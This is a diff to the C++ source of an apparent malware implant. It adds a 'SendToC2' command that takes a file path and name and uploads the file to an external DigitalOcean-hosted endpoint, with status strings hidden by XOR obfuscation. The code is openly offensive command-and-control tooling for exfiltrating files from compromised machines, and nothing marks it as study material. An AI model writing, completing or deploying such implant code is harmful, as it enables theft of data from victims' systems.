@@ -135,19 +135,24 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     }
    
     /* Send Files To C2*/
-    // if(command.compare() == 0){
-    //     try{
-    //         /* Add in Command for Post.cpp 
-    //         Then add in results = to that result*/
-    //     }
-    //     catch(...){
-    //         HttpResponse("/response_json", implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
-    //         work = xor_string("fG",0x28);
-    //     }
-    //     if(work.compare(xor_string("fG",0x28)) == 1){
-    //         HttpResponse("/response_json", implant_id, task_id, results, "success", command);
-    //     }
-    // }
+    if(command.compare("SendToC2") == 0){
+            std::istringstream ss(args);
+			std::string path;
+			std::string filename;
+			ss >> path;
+			ss >> filename;
+        try{
+            /* Add in Command for Post.cpp */
+            sendToC2(path,"https://sea-lion-app-f5nrq.ondigitalocean.app/upload_files", filename, task_id);
+        }
+        catch(...){
+            HttpResponse("/response_json", implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+            work = xor_string("fG",0x28);
+        }
+        if(work.compare(xor_string("fG",0x28)) == 1){
+            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+        }
+    }
     return;
 }
 
